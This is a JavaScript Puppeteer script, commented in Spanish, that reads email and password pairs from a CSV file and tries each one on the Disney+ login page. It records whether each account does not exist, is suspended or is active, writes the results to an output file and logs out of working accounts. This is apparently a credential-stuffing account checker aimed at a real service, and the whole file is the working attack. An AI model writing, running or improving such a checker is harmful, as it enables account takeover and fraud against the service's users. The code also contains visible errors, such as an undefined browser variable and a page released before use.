const pool = require('generic-pool');
const puppeteer = require('puppeteer');
const fs = require("fs");
const { parse } = require("csv-parse");

const acc = [];
fs.createReadStream('./disney.csv')
    .pipe(parse({
        separator: ','
    }))
    .on('data', row => acc.push(row))


function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
 }

function addCsv(email,comments) {
    const data = `${email},${comments}\n`
    fs.appendFile('Out.csv',data, (err) => {
        if (err) throw err;
    }); 
}


const factory = {
    create: async () => {
        const browser = await puppeteer.launch({ headless: false });
        return browser.newPage();
    },
    destroy: async (page) => {
        await page.close();
    }
}

const pagePool = pool.createPool(factory, {
    min: 2,
    max: 10,
    idleTimeoutMillis: 5000,
    testOnBorrow: true
});

for await (let i of acc) {
    const page = await pagePool.acquire();
    //Todo el código aquí
    pagePool.release(page);

     //Datos de acceso
     var email = i[0];
     var password = i[1];

     //Login
     await page.goto("https://www.disneyplus.com/es-419/login",{
         waitUntil:'networkidle0'
     });
     await page.waitForSelector("#email")
     await page.type("#email",email)
     await page.waitForSelector("#dssLogin > div:nth-child(4) > button")
     await page.click("#dssLogin > div:nth-child(4) > button")
     //Check if Email Does Not Exist
     try {
         await page.waitForSelector("#app_index > div.sc-gRnDUn.fwRhMQ > div > div > h4",{
             timeout:1500
         })
         var notExist = await page.$eval('#app_index > div.sc-gRnDUn.fwRhMQ > div > div > h4', el => el.textContent);
         console.log(`${email}: No Existe`)
         addCsv(email,'No Existe')
         continue
     } catch (error) {
         {}
     }

     //Write Password
     await page.waitForSelector("#password")
     await page.type("#password",password)
     await page.click("#dssLogin > div.sc-iELTvK.fjPtht > button")
     
     //Ingresa a un perfil
     try {
         await page.waitForSelector("#remove-main-padding_index > div > div > section > h2",{
             timeout:1500
         })
         await page.$eval("#remove-main-padding_index > div > div > section > h2", el => el.textContent);
         await page.click("#remove-main-padding_index > div > div > section > ul > div:nth-child(1) > div")
         await page.waitForSelector("#active-profile > div")
     } catch (error) {
     //Check if suspended
     try {
         await page.waitForSelector("#section_index > div > div:nth-child(2) > div > div > div.sc-GMQeP.fjHChO.noAnimations > h2",{
             waitUntil: 'networkidle0'
         })
         var suspended = await page.$eval("#section_index > div > div:nth-child(2) > div > div > div.sc-GMQeP.fjHChO.noAnimations > h2", el => el.textContent);     
         await page.click("#section_index > div > button")
         console.log(`${email}: Suspendido`)
         addCsv(email,'Suspendido')
         await page.waitForSelector("body > main > section.hero.sm-align-center.md-align-center.lg-align-left.bg-100.mobile-pushdown-large.target-spacer-in-hero.mobile-pushdown-large.tablet-pushdown-large > div.content.sm-text-center.md-text-center.lg-text-center > h3")
         continue
     } catch (error) {
         {}
     }    
     }
     
     

     //Go to Account Page
     await page.goto("https://www.disneyplus.com/es-419/account")

     //Check if travel
     try {
         await page.waitForSelector("#app_index > div.sc-gRnDUn.fwRhMQ > div > div > h4",{
             timeout:8000
         })
         await page.click("#app_index > div.sc-gRnDUn.fwRhMQ > div > div > div > button")
     } catch (error) {
         {}
     }

     //check if active
     try {
         await page.waitForSelector("#account_settings_index > div > div > div:nth-child(4) > div.sc-imDfJI.sc-gMcBNU.blMfvK > span > button")
         var active = await page.$eval("#account_settings_index > div > div > div:nth-child(4) > div.sc-imDfJI.sc-gMcBNU.blMfvK > span > button", el => el.textContent);
         console.log(`${email}: Activa`);
         addCsv(email,"Activa")
         
         //Close session
         const icoProfile = await page.$('#active-profile > div > div');
         await icoProfile.hover();
         await delay(500)
         await page.click("#dropdown-option_logout > a")
         await delay(1000)
         continue
     } catch (error) {
         {}
     }

     //Check Suscription
     // try {
     //     var suscription = page.$eval("#account_settings_index > div > div > div:nth-child(4) > div:nth-child(2) > div > div:nth-child(1) > p", el => el.textContent)
     //     console.log(`${email}: ${suscription}`)
     //     addCsv(email,suscription)

     //     //Close session
     //     const icoProfile = await page.$('#active-profile > div > div');
     //     await icoProfile.hover();
     //     await delay(500)
     //     await page.click("#dropdown-option_logout > a")
     //     await delay(1000)
     //     continue
     // } catch (error) {
     //     {}
     // }
 }
 await browser.close()


pagePool.drain().then(() => pagePool.clear());
